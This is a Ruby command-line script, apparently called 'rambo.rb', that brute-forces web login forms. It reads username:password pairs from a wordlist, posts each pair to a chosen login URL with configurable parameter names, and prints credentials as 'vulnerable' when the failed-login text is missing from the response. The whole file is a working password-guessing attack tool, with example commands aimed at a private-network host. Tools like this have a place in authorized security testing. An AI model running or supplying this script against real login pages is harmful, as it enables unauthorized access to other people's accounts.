#!/usr/bin/env ruby
#coding:utf-8

require 'Typhoeus'
require 'hydra'
require 'optimist'
require 'colorize'




##################################---  Menu  ---##################################
opts = Optimist::options do
  opt :simpleexample, "ruby rambo.rb -w test.txt -d http://172.16.139.221/app2/index.php  -u username -p password  -f  No account found with that username. ", :type => :string   
  opt :advexample, "ruby rambo.rb -w test.txt -d http://172.16.139.221/app2/index.php  -u username -p password -c customparam1 -t custominput1 -o customparam2 -m customvalue2 -f  No account found with that username.", :type => :string   
  opt :wordlist, "Wordlist Filename - username:password format", :type => :string        # string --wordlist <s>, default nil
  opt :domain, "domain and path to login - https://127.0.0.1/login.php", :type => :string      		     
  opt :userparameter, "Username parameter - parameter name that sends the username", :type => :string      		     
  opt :passwordparameter, "Password parameter - parameter name that sends the password", :type => :string      		     
  opt :customparamname1, "Custom Parameter Name one", :type => :string      		     
  opt :customparamvalue1, "Custom Parameter value one", :type => :string      		     
   opt :customparamname2, "Custom Parameter Name Two", :type => :string      		     
  opt :customparamvalue2, "Custom Parameter value Two", :type => :string      
  opt :failedlogin, "Enter failed login string - i.e invalid username and password", :type => :string  
end

wordlist = opts.wordlist
domain = opts.domain
userparameter = opts.userparameter
passwordparameter = opts.passwordparameter
customparamname1 = opts.customparamname1
customparamvalue1 = opts.customparamvalue1
customparamname2 = opts.customparamname2
customparamvalue2 = opts.customparamvalue2
failedlogin = opts.failedlogin


##################################---  open file and get usernames and passwords ---##################################
Typhoeus::Config.user_agent = "Rambo.1.0"

def bruteforce(wordlist,domain,userparameter,passwordparameter,customparamname1=nil,customparamvalue1=nil,customparamname2=nil,customparamvalue2=nil,failedlogin)


fh = open wordlist
 
fh.each do |line|
userandpass = line.split(":")         #split username and password file by :
username = userandpass[0]		  #strip the first value (usernames) and save the array to username
password = userandpass[1]			 #strip the second value (password) and save the array to password

request = 
Typhoeus::Request.new(domain, followlocation: true,                              #connect to proxy  & set follow location  on 300 reqs.         
  method: :post,   
  body: { "#{userparameter}": username, "#{passwordparameter}": password, "#{customparamname1}": customparamvalue1, "#{customparamname2}": customparamvalue2},										
  headers: { Accept: "text/html"}
)

hydra = Typhoeus::Hydra.hydra
hydra.queue(request)
hydra.run


response = request.response
body = response.body


if body.include? ("#{failedlogin} ")
	puts "Not Vulnerable - Failed response found in body".green
else
	puts "------- vulnerable ------- Response Code: ""#{response.code} " "Username: #{username} " "Password: #{password}".red
end





end
 
fh.close

end

wordlist2 = bruteforce(wordlist,domain,userparameter,passwordparameter,customparamname1,customparamvalue1,customparamname2,customparamvalue2,failedlogin)


